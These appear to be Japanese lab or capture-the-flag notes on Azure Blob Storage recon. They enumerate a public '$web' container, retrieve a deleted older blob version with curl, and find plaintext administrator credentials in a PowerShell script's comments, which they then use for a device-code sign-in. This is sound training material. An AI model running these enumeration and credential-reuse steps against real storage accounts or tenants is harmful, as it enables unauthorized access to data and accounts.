# 攻撃の概要
![[images/Pasted image 20260910231229.png]]

# URL要素
```
https://mbtwebsite.blob.core.windows.net/$web/index.html
```

`blob.core.windows.net`: これはAzure Blob Storageサービスです
`$web`: これはウェブサイトをホストするコンテナ名

ヘッダでAzure-Blobサーバか調べる
```
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers
```

ヘッダのサーバに`Windows-Azure-Blob`であることが分かる
![[images/Pasted image 20260907232807.png]]


# Blobの列挙
エンドポイントは`https://mbtwebsite.blob.core.windows.net/$web`の後にくっつける。例えば`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list`

コンテナ内のblob一覧を取得するクエリ
```
?restype=container&comp=list
```

delimiterパラメータでディレクトリごとに表示させるフィルタが可能
- ディレクトリをグループ化
```
?restype=container&comp=list&delimiter=%2F
```

- static/ディレクトリのblob一覧を取得
```
?restype=container&comp=list&prefix=static%2F
```

# バージョニング
Azure StorageにはBlob Versioningという機能があり、有効になっていると、blobが上書き・削除されても過去のバージョンが内部的に保持され続ける

必須のヘッダをつけてREST APIを叩く
```sh
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions'
```

xmllintのインストール
```sh
apt install libxml2-utils
```

xmlを確認
```sh
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format - | less
```

過去のバージョンでファイル名とVersionnIdを指定してダウンロード可能
![[images/Pasted image 20260908000332.png]]

ダウンロードコマンド
```sh
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z' --output scripts-transfer.zip
```

#  Recon ~ サインインまでの流れ
ここまでReconを実施した。
zipファイル展開するとAD管理者アカウントの認証情報が含まれていることが分かる。

entra_users.ps1はEntra の全ユーザ監査をするスクリプトで、コメントに認証情報が含まれている。

entra_users.ps1
```powershell
Import-Module MSAL.PS

# Username: marcus@megabigtech.com
# Password: TheEagles12345!

# Use Microsoft's public Azure PowerShell client ID
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
$TenantId = "common"  # Or use your actual tenant ID
$Scopes   = @("https://graph.microsoft.com/.default")

# Device code login (supports MFA)
$TokenResponse = Get-MsalToken -ClientId $ClientId -TenantId $TenantId -Scopes $Scopes -DeviceCode

# Use the access token in Graph API call
$AccessToken = $TokenResponse.AccessToken
$GraphApiUrl = "https://graph.microsoft.com/v1.0/users?`$select=displayName,userPrincipalName"

$headers = @{
    "Authorization" = "Bearer $AccessToken"
    "Content-Type"  = "application/json"
}

$response = Invoke-RestMethod -Uri $GraphApiUrl -Headers $headers -Method Get

# Show formatted output
$response.value | Format-Table displayName, userPrincipalName
```


powershellを使用して認証
```powershell
Install-Module -Name MSAL.PS
```

実行後コメントに書いてあった認証情報を使ってデバイスコード認証でログインする
```powershell
./entra_users.ps1
```

![[images/Pasted image 20260908002332.png]]